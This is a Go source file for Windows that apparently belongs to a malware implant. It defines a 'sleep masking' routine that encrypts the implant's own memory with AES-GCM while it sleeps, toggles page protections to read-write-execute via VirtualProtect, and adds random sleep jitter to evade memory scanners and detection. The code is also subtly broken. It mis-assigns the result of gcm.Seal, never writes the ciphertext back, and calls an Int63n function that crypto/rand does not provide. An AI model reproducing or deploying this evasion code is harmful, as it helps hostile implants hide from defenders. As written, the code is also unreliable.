//go:build windows

package sleep_masking

import (
"crypto/aes"
"crypto/cipher"
"crypto/rand"
"io"
"syscall"
"time"
"unsafe"
)

var (
kernel32                = syscall.NewLazyDLL("kernel32.dll")
procVirtualProtect      = kernel32.NewProc("VirtualProtect")
procSleep               = kernel32.NewProc("Sleep")
)

const (
PAGE_READWRITE        = 0x04
PAGE_EXECUTE_READ     = 0x20
PAGE_EXECUTE_READWRITE = 0x40
)

type SleepMasker struct {
ImplantBase uintptr
ImplantSize uintptr
Key         []byte
Nonce       []byte
}

func (s *SleepMasker) EncryptRegion() {
if s.ImplantBase == 0 || s.ImplantSize == 0 {
return
}
block, err := aes.NewCipher(s.Key)
if err != nil {
return
}
gcm, err := cipher.NewGCM(block)
if err != nil {
return
}
var oldProtect uint32
procVirtualProtect.Call(
s.ImplantBase,
s.ImplantSize,
PAGE_READWRITE,
uintptr(unsafe.Pointer(&oldProtect)),
)
_, err = gcm.Seal(nil, s.Nonce, unsafe.Slice((*byte)(unsafe.Pointer(s.ImplantBase)), s.ImplantSize), nil)
if err != nil {
return
}
procVirtualProtect.Call(
s.ImplantBase,
s.ImplantSize,
PAGE_EXECUTE_READWRITE,
uintptr(unsafe.Pointer(&oldProtect)),
)
}

func (s *SleepMasker) DecryptRegion() {
if s.ImplantBase == 0 || s.ImplantSize == 0 {
return
}
block, err := aes.NewCipher(s.Key)
if err != nil {
return
}
gcm, err := cipher.NewGCM(block)
if err != nil {
return
}
var oldProtect uint32
procVirtualProtect.Call(
s.ImplantBase,
s.ImplantSize,
PAGE_READWRITE,
uintptr(unsafe.Pointer(&oldProtect)),
)
plaintext, err := gcm.Open(nil, s.Nonce, unsafe.Slice((*byte)(unsafe.Pointer(s.ImplantBase)), s.ImplantSize), nil)
if err != nil {
return
}
copy(unsafe.Slice((*byte)(unsafe.Pointer(s.ImplantBase)), s.ImplantSize), plaintext)
procVirtualProtect.Call(
s.ImplantBase,
s.ImplantSize,
PAGE_EXECUTE_READWRITE,
uintptr(unsafe.Pointer(&oldProtect)),
)
}

func (s *SleepMasker) GenerateKey() {
s.Key = make([]byte, 32)
s.Nonce = make([]byte, 12)
if _, err := io.ReadFull(rand.Reader, s.Key); err != nil {
return
}
if _, err := io.ReadFull(rand.Reader, s.Nonce); err != nil {
return
}
}

func (s *SleepMasker) ExecuteSleep(duration time.Duration) {
if duration <= 0 {
return
}
s.EncryptRegion()
procSleep.Call(uintptr(duration.Milliseconds()))
s.DecryptRegion()
}

func (s *SleepMasker) ExecuteSleepWithRandomJitter(baseDuration, jitterRange time.Duration) {
if baseDuration <= 0 {
return
}
jitter := time.Duration(rand.Int63n(int64(jitterRange)))
totalSleep := baseDuration + jitter
s.EncryptRegion()
procSleep.Call(uintptr(totalSleep.Milliseconds()))
s.DecryptRegion()
}
